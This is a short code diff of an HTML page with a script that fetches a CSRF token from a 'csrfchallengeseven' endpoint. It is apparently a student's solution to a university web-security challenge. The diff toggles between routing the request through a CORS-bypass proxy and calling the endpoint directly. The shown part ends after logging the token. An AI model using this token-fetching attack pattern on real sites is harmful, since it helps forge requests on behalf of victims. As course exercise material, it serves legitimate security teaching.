@@ -3,11 +3,11 @@
 <title>SuperQben</title>
 <meta charset="UTF-8">
 <body>
-
+<!--https://cors-escape.herokuapp.com/-->
   <script> 
     var xhr = new XMLHttpRequest();
     console.log("getting token...")
-    xhr.open("GET", "https://cors-escape.herokuapp.com/https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e", false);
+    xhr.open("GET", "https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e", false);
     xhr.send();
     if(xhr.readyState == 4 && xhr.status == 200) {
      console.log(xhr.responseText)
